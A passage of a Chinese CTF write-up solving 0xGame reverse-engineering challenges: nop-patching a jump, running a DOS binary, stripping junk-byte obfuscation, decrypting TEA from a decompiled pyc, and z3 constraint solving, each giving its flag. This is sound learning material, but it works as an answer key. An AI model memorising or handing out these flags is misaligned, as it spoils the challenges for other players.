在0x40177B的位置，有`je attachment.401786`，执行它，就会在后续输出中给出假flag。因此，从0x40177B开始，将`je 0x401786`改为`nop; nop`，保存补丁，再运行程序，即可录屏截取到真flag：

{% asset_img YUNDUOREALFLAG.png %}

### Flag

0xGame{Dyn4m1c_Dyn4m1c_Dyn4m1c}

## 五. 旧时代的信号

### 解题过程

下载附件，解压，得到attachment3.EXE，用DIE扫描，得到：

> Operation system: MS-DOS [8086, 16位, EXE]

使用DOSbox-X，mount挂载，dir查看目录，打开文件，得到flag

### Flag

0xGame{JuS7_g1v3_16bit7t_@_try!!}

## 六. ez_flower

### 解题过程

下载附件，解压，阅读README，得知三组垃圾字节为`11 22 33`，`44 55 66`，`12 34 56`。用IDA打开，Alt+B搜索三个字节，按U取消定义，将其都改为`90 90 90`，即三个`nop`，然后按C重建。应用补丁后，再查看main函数，注意到：

```c
for ( j = 0; j < 0x2F; ++j )
 Buf2[j] = byte_40F170[j] ^ 0x80;
```

此处把byte_40F170以0x80进行了XOR。于是手动提取其Hex，得到：

```hex
B0 E5 CE E8 F4 EC FB C4 F6 C4 DF C1 EF B3 DF ED B1 F6 E4 B3 F9 A4 DF C0 F9 EC DF DA D6 F6 B0 F6 F6 A0 E9 B3 C0 E2 B7 F0 ED E2 F3 F3 A1 A1 FD
```

通过Hex转换，再XOR，得到：
```text
0eNhtl{DvD_Ao3_m1vd3y$_@yl_ZVv0vv i3@b7pmbss!!}
```
再用凯撒密码解密，得到flag。

### Flag

0xGame{WoW_Th3_f1ow3r$_@re_SOo0oo b3@u7ifull!!}

## 七. Guess

### 解题过程

下载附件，解压，阅读README，得知这是一个python PYC逆向。将attachment.exe用DIE分析，得知python版本为3.14。

用`pyinstxtractor`提取，在extracted文件夹中发现game.pyc。使用pycdc将其还原，发现真flag经过TEA解密，而并未输出，所以删除多余的main部分，将末尾直接改为输出flag：

```python
import struct
DELTA = 2654435769
MASK = 4294967295
TEA_KEY = b'guess_secret_key'
FLAG_CIPHERTEXT = bytes.fromhex('1102c93630fe71bd39ad4e4cc34600299897001c3300581e465c56d2a11ba430819e7a59f1c20188f40ccba3a312dd3d')
  
def tea_decrypt(data: bytes, key: bytes) -> bytes:
    '''Decrypt little-endian TEA blocks.'''
  
    words = struct.unpack('<4I', key)
    result = bytearray()
    for offset in range(0, len(data), 8):
        left, right = struct.unpack('<2I', data[offset:offset + 8])
        total = DELTA * 32 & MASK
        for _ in range(32):
            right = right - ((left << 4) + words[2] ^ left + total ^ (left >> 5) + words[3]) & MASK
            total = total - DELTA & MASK
            left = left - ((right << 4) + words[0] ^ right + total ^ (right >> 5) + words[1]) & MASK
        result.extend(struct.pack('<2I', left, right))
        continue
    padding = result[-1]
    if 1 <= padding <= 8:
        if result[-padding:] != bytes([padding]) * padding:
            raise ValueError('bad padding')
    return bytes(result[:-padding])
  
if __name__ == '__main__':
    flag = tea_decrypt(FLAG_CIPHERTEXT, TEA_KEY)
    print(flag.decode())
```

运行，得到flag。

### Flag

0xGame{Congratulations_0n_y0ur_v1ct0ry：）}

## 八. z3-solver

### 解题过程

下载附件，解压，用IDA分析。注意到main函数中有：

```c
      if ( (unsigned int)sub_401550(a1: Buffer) != 0 )
      {
        puts(Buffer: "Correct! Constraints solved.");
        return 0;
      }
```

查看sub_401550：

```c
__int64 __fastcall sub_401550(__int64 a1)
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 22; ++i )
  {
    if ( *(_BYTE *)(a1 + i) <= 0x1Fu || *(_BYTE *)(a1 + i) > 0x7Eu )
      return 0;
    if ( 5 * *(unsigned __int8 *)(a1 + (i + 1) % 23)
       + 3 * *(unsigned __int8 *)(a1 + i)
       + 11 * *(unsigned __int8 *)(a1 + (i + 7) % 23)
       + 7 * *(unsigned __int8 *)(a1 + (i + 4) % 23) != word_404000[i] )
      return 0;
  }
  return 1;
}
```

所有字符都在0x20到0x7E之间，需要满足一个线性关系：
```
3*x[i] + 5*x[(i+1)%23] + 7*x[(i+4)%23] + 11*x[(i+7)%23] = word_404000[i]
```
查看`word_404000`：

```text
.rdata:0000000000404000 word_404000     dw 0B21h, 7BFh, 0A2Ch, 0A2Bh, 8FCh, 860h, 0AC7h, 0A21h
.rdata:0000000000404000                                         ; DATA XREF: sub_401550+13F↑o
.rdata:0000000000404010                 dw 7EEh, 0A0Eh, 0B55h, 0A05h, 0ABBh, 902h, 0BC8h, 0BCBh
.rdata:0000000000404020                 dw 6FFh, 0C4Eh, 0A48h, 7E3h, 0AEFh, 0A27h, 0A57h
```

得到23个字节的`word_404000`，根据题干，使用z3-solver：

```python
from z3 import *
# 1. 声明变量：23个整数变量，代表flag的每个字符
#    这里用列表推导式创建 x[0] 到 x[22]
xs = [Int(f'x{i}') for i in range(23)]
# 2. 创建求解器
s = Solver()
# 3. 添加可打印字符范围约束 (0x20 到 0x7E)
for x in xs:
    s.add(x >= 0x20, x <= 0x7E)
# 4. 添加 23 条线性等式约束
b = [0x0B21, 0x07BF, 0x0A2C, 0x0A2B, 0x08FC, 0x0860, 0x0AC7, 0x0A21, 0x07EE, 0x0A0E, 0x0B55, 0x0A05, 0x0ABB, 0x0902, 0x0BC8, 0x0BCB, 0x06FF, 0x0C4E, 0x0A48, 0x07E3, 0x0AEF, 0x0A27, 0x0A57]
for i in range(23):
    # 对应 C 代码中的表达式：5*Buffer[(i+1)%23] + 3*Buffer[i] + 11*Buffer[(i+7)%23] + 7*Buffer[(i+4)%23]
    expr = 5 * xs[(i + 1) % 23] + 3 * xs[i] + 11 * xs[(i + 7) % 23] + 7 * xs[(i + 4) % 23]
    s.add(expr == b[i])
# 5. 求解并输出
if s.check() == sat:
    m = s.model()
    flag = ''.join([chr(m[x].as_long()) for x in xs])
    print(f"Flag: {flag}")
else:
    print("无解")
```

运行，得到flag。

### Flag

0xGame{z3_Se3ms_ezzz2z}

---

本文完篇于2026.10.04

[^1]: 经试验，重复做题时，每次的box编号可能不同
[^2]: 正确做法应为查看EXIF元数据
[^3]: 不会格式语法，这题是跟着AI做的
[^4]: 还不会写脚本，这题的脚本是AI带着写的
[^5]: 这部分AI使用较多，主要是解读伪代码和写python脚本。这两个内容正在学习中